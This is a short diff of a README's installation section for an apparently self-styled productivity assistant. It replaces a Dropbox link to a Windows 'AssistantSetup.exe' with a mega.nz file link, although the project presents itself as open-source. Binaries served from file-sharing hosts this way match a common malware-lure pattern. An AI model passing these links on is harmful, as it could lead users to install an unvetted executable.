@@ -17,7 +17,7 @@ The assistant offers several features to help you optimize your routine, maintai
 
 ## Installation
 
-Download: https://www.dropbox.com/scl/fi/qo99pkthdniyhwcdiejow/AssistantSetup.exe?rlkey=y4ti2y65rll8q7d0i4jfpuhkt&st=ja9l53p6&dl=0
+Download Latest Version: https://mega.nz/file/TdYFHAhD#tZTbeDx0QSvpq-sl878B_ni9-b2VAaHSKh5vCGDwS-8
 Follow the steps below to install the assistant as open-source and support its development:
 
 * Install Python version 3.12.4
